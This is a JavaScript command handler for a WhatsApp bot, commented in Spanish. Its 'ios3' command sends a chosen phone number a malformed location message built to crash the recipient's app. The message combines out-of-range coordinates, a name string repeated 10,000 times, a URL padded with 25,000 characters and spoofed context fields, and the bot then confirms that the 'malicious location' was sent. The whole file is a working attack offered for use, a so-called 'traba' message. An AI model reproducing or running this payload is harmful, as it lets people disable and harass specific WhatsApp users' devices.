let handler = async (m, { conn, args, command }) => {
  const botNumber = conn.user.jid; // JID completo del número del bot
  const from = m.chat; // De dónde se ejecuta el comando

  // Si el comando no viene desde el número del bot, bloquearlo
  if (from !== botNumber) {
    return m.reply('🚫 Este comando sólo puede ejecutarse desde el número donde está alojado el bot.');
  }

  const target = args[0]?.replace(/\D/g, '') + '@s.whatsapp.net'; // Extrae el número de destino
  if (!target || !target.endsWith('@s.whatsapp.net')) {
    return m.reply('⚠️ Debes proporcionar un número válido. Ejemplo: *.ios 5219991234567*');
  }

  await conn.relayMessage(target, {
    locationMessage: {
      degreesLatitude: -9.09999262999,
      degreesLongitude: 199.99963118999,
      jpegThumbnail: null,
      name: "馃└ 饾悜蜖饾悽袒饾惓廷饾惐童饾悤袒饾悶蜏饾惀袒饾惓汀 饾悗蜖饾悷袒饾悷廷饾悽蜏饾悳童饾悽袒饾悮袒饾惀-饾悎童饾悆!" + "饝噦饝喌饝喆饝喛".repeat(10000),
      address: "denny Official!",
      url: `https://crash.apple.${"馃└".repeat(25000)}.com`,
      contextInfo: {
        quotedAd: {
          advertiserName: "x",
          mediaType: "IMAGE",
          jpegThumbnail: null,
          caption: "x"
        },
        placeholderKey: {
          remoteJid: "0@s.whatsapp.net",
          fromMe: false,
          id: "ABCDEF1234567890"
        }
      }
    }
  }, {});

  await m.reply('🐢 Ubicación maliciosa enviada correctamente.');
};

handler.command = ['ios3'];
handler.help = ['ios3 <número>'];
handler.tags = ['traba'];
handler.group = false;
handler.premium = false;
// NO usar handler.owner porque no es el dueño, es el número del bot mismo

export default handler;